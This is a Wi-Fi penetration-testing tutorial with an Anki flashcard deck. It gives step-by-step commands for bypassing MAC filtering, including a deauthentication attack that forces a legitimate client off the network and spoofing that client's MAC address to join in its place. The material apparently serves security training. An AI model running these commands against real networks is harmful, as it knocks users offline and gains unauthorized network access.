# Wi-Fi Pentesting Chain #9: Bypassing MAC Filtering

MAC filtering is a weak access control method where only devices with approved MAC addresses are allowed to connect. Since MAC addresses can be spoofed, this control can be bypassed.

---

## Step 1: Identify Target Network and Clients

1. Put your interface into monitor mode if it’s not already:
   ```bash
   sudo airmon-ng start wlan0
   ```

2. Use `airodump-ng` to scan for networks and associated clients:
   ```bash
   sudo airodump-ng wlan0mon
   ```

   **What you’re looking for:**
   - Target **BSSID** (the AP’s MAC address).
   - **ESSID** (network name).
   - **Client MAC addresses** (STATION field).

   **Diversion:**
   - If you see **no clients connected**, MAC spoofing won’t help unless you know an allowed MAC address. You may have to wait until a client connects.

---

## Step 2: Select a Client MAC Address to Imitate

- Pick one of the connected client MACs.
- Note that if you spoof an address that is still connected, you’ll cause **MAC collisions**, which may:
  - Disrupt both connections.
  - Trigger suspicion.

**Better approach:**
- Wait until the client disconnects naturally.
- Or force the client to disconnect using a **deauthentication attack**:
  ```bash
  sudo aireplay-ng -0 5 -a <BSSID> -c <Client_MAC> wlan0mon
  ```

---

## Step 3: Spoof Your MAC Address

1. Stop monitor mode to work with a managed interface:
   ```bash
   sudo airmon-ng stop wlan0mon
   ```

2. Check your current MAC address:
   ```bash
   sudo macchanger wlan0
   ```

3. Change your MAC address to the client’s MAC:
   ```bash
   sudo ifconfig wlan0 down
   sudo macchanger wlan0 -m <Client_MAC>
   sudo ifconfig wlan0 up
   ```

4. Verify the change:
   ```bash
   ifconfig wlan0
   ```

---

## Step 4: Connect to the Network

- Now that your MAC matches an authorized client, connect normally with the password:
  ```bash
  sudo wpa_supplicant -c wpa.conf -i wlan0 &
  sudo dhclient wlan0
  ```

**Diversion:**
- If the AP also has a **5 GHz band** with no active clients, spoof a client’s MAC from 2.4 GHz but connect to 5 GHz. This avoids collisions.

---

## Step 5: Confirm Successful Connection

- Check that you have an IP:
  ```bash
  ifconfig wlan0
  ```
- Verify connectivity with ping:
  ```bash
  ping -c 4 8.8.8.8
  ```

If successful, you’ve bypassed MAC filtering.

---

## Anki Deck:
```
#separator:tab
#html:true
#guid column:1
#notetype column:2
#deck column:3
#tags column:6
1aB3cD9fGh	Basic	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What is MAC filtering in Wi-Fi security?	A method that restricts network access to devices with pre-approved MAC addresses.	wifi
2bC4dE8gHi	Basic	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	Why is MAC filtering considered weak security?	Because MAC addresses can be easily spoofed by attackers.	wifi
3cD5eF7hIj	Basic	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What happens if two devices use the same MAC address on a network?	It causes a MAC collision, disrupting connectivity for both devices.	wifi
4dE6fG1iJk	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What `airodump-ng` command scans for networks and clients using the `wlan0mon` interface?	<code>sudo airodump-ng wlan0mon</code>	wifi
5eF7gH2jKl	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What `aireplay-ng` command sends 5 deauth packets to client &lt;Client_MAC&gt; on AP &lt;BSSID&gt;?	<code>sudo aireplay-ng -0 5 -a &lt;BSSID&gt; -c &lt;Client_MAC&gt; wlan0mon</code>	wifi
6fG8hI3kLm	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What command stops monitor mode on `wlan0mon`?	<code>sudo airmon-ng stop wlan0mon</code>	wifi
7gH9iJ4lMn	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What command displays the current and permanent MAC address of `wlan0`?	<code>sudo macchanger wlan0</code>	wifi
8hI0jK5mNo	Cloze (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What sequence of commands changes `wlan0` MAC to &lt;Client_MAC&gt;?<br><br>{{c1::sudo ifconfig wlan0 down}}<br>{{c1::sudo macchanger wlan0 -m &lt;Client_MAC&gt;}}<br>{{c1::sudo ifconfig wlan0 up}}		wifi
9iJ1kL6nOp	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What command verifies the new MAC address of `wlan0`?	<code>ifconfig wlan0</code>	wifi
0jK2lM7oPq	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What command connects to a Wi-Fi network using `wpa_supplicant` with config file `wpa.conf`?	<code>sudo wpa_supplicant -c wpa.conf -i wlan0 &amp;</code>	wifi
aK3lN8pQrR	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What command requests an IP from DHCP after connecting with `wpa_supplicant`?	<code>sudo dhclient wlan0</code>	wifi
bL4mO9qRsS	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What command checks if you successfully obtained an IP on `wlan0`?	<code>ifconfig wlan0</code>	wifi
cM5nP0rStT	Basic (type in the answer)	Ops::WiFi Gym::Chain 09: Bypassing MAC Filtering	What command tests connectivity by pinging Google DNS?	<code>ping -c 4 8.8.8.8</code>	wifi
```